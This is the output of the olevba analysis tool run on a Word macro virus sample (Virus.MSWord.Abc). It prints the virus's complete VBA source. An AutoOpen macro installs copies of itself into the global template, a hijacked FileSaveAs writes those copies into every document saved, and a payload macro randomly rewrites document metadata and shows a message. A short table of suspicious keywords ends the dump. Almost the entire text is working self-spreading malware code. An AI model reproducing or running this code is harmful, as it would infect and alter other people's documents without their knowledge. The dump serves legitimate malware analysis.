olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Abc-33e97db2aa4bfb324ea7c2daaf0fce5322dbf329
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Abc-33e97db2aa4bfb324ea7c2daaf0fce5322dbf329 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Abc-33e97db2aa4bfb324ea7c2daaf0fce5322dbf329 - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Alice loves Bob"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoOpen.MAIN"
Dim iMacroCount
Dim i
Dim bInstalled
Dim sMe$
Dim sMacro$
    On Error GoTo -1: On Error GoTo Abort
    iMacroCount = WordBasic.CountMacros(0, 0)
    'see if we're already installed
    For i = 1 To iMacroCount
        If WordBasic.[MacroName$](i, 0, 0) = "Colin" Then
            bInstalled = -1
        End If
    Next i
    If Not bInstalled Then
        'add FileSaveAs and copies of AutoOpen and FileSaveAs.
        sMe$ = WordBasic.[FileName$]()
        sMacro$ = sMe$ + ":Colin"
        WordBasic.MacroCopy sMacro$, "Global:Colin"
        sMacro$ = sMe$ + ":Bob"
        WordBasic.MacroCopy sMacro$, "Global:FileSaveAs"
        sMacro$ = sMe$ + ":Bob"
        WordBasic.MacroCopy sMacro$, "Global:Bob"
        sMacro$ = sMe$ + ":Alice"
        WordBasic.MacroCopy sMacro$, "Global:Alice"
    End If
Abort:
End Sub
-------------------------------------------------------------------------------
VBA MACRO Colin.bas 
in file: Virus.MSWord.Abc-33e97db2aa4bfb324ea7c2daaf0fce5322dbf329 - OLE stream: 'Macros/VBA/Colin'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Colin loves to play."
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.Colin.MAIN"
Dim Num
If Rnd() < 0.5 Then
    WordBasic.FileSummaryInfo Author:="FC"
End If
If Rnd() < 0.5 Then
    WordBasic.FileSummaryInfo Title:="Smash Technology"
End If
If Rnd() < 0.5 Then
    WordBasic.FileSummaryInfo Subject:="Resist Oppression"
End If
If Rnd() < 0.5 Then
    WordBasic.FileSummaryInfo Keywords:=Str(WordBasic.Int(Rnd() * 100000000))
End If
If Rnd() < 0.5 Then
    WordBasic.FileSummaryInfo Comments:=Str(WordBasic.Int(Rnd() * 100000000))
End If
Num = Rnd()

If Num < 0.2 Then
WordBasic.MsgBox "I am happy; are you too?", "Colin Says:", 52
End If
If Num < 0.2 Then WordBasic.Beep

End Sub
-------------------------------------------------------------------------------
VBA MACRO Alice.bas 
in file: Virus.MSWord.Abc-33e97db2aa4bfb324ea7c2daaf0fce5322dbf329 - OLE stream: 'Macros/VBA/Alice'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Alice loves Bob"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.Alice.MAIN"
Dim iMacroCount
Dim i
Dim bInstalled
Dim sMe$
Dim sMacro$
    On Error GoTo -1: On Error GoTo Abort
    iMacroCount = WordBasic.CountMacros(0, 0)
    'see if we're already installed
    For i = 1 To iMacroCount
        If WordBasic.[MacroName$](i, 0, 0) = "Colin" Then
            bInstalled = -1
        End If
    Next i
    If Not bInstalled Then
        'add FileSaveAs and copies of AutoOpen and FileSaveAs.
        sMe$ = WordBasic.[FileName$]()
        sMacro$ = sMe$ + ":Colin"
        WordBasic.MacroCopy sMacro$, "Global:Colin"
        sMacro$ = sMe$ + ":Bob"
        WordBasic.MacroCopy sMacro$, "Global:FileSaveAs"
        sMacro$ = sMe$ + ":Bob"
        WordBasic.MacroCopy sMacro$, "Global:Bob"
        sMacro$ = sMe$ + ":Alice"
        WordBasic.MacroCopy sMacro$, "Global:Alice"
    End If
Abort:
End Sub
-------------------------------------------------------------------------------
VBA MACRO Bob.bas 
in file: Virus.MSWord.Abc-33e97db2aa4bfb324ea7c2daaf0fce5322dbf329 - OLE stream: 'Macros/VBA/Bob'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Bob loves Alice"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.Bob.MAIN"
Dim sMe$
Dim sTMacro$
If Rnd() < 0.1 Then
    WordBasic.Call "Colin"
End If
'this becomes the FileSaveAs for the global template
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
On Error GoTo -1: On Error GoTo Bail
WordBasic.CurValues.FileSaveAs dlg
WordBasic.Dialog.FileSaveAs dlg
If dlg.Format = 0 Then dlg.Format = 1
sMe$ = WordBasic.[FileName$]()
sTMacro$ = sMe$ + ":AutoOpen"
WordBasic.MacroCopy "Global:Alice", sTMacro$, 1
sTMacro$ = sMe$ + ":Alice"
WordBasic.MacroCopy "Global:Alice", sTMacro$, 1
sTMacro$ = sMe$ + ":Bob"
WordBasic.MacroCopy "Global:Bob", sTMacro$, 1
sTMacro$ = sMe$ + ":Colin"
WordBasic.MacroCopy "Global:Colin", sTMacro$, 1
WordBasic.FileSaveAs dlg
GoTo Done

Bail:
If Err.Number <> 102 Then
    WordBasic.FileSaveAs dlg
End If
Done:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

